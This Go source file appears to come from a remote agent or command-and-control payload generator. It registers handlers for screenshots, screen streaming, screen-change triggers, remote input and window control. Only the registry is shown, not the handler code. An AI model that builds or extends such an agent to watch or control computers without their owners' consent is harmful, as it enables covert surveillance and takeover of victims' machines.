//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "screen" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["screenshot"] = handleScreenshot
	taskHandlers["screenshot_window"] = handleScreenshotWindow
	taskHandlers["screen_stream_start"] = handleScreenStreamStart
	taskHandlers["screen_stream_stop"] = handleScreenStreamStop
	taskHandlers["screen_trigger_start"] = handleScreenTriggerStart
	taskHandlers["screen_trigger_stop"] = handleScreenTriggerStop
	taskHandlers["remote_input"] = handleRemoteInput
	taskHandlers["window_list"] = handleWindowList
	taskHandlers["window_close"] = handleWindowClose
}
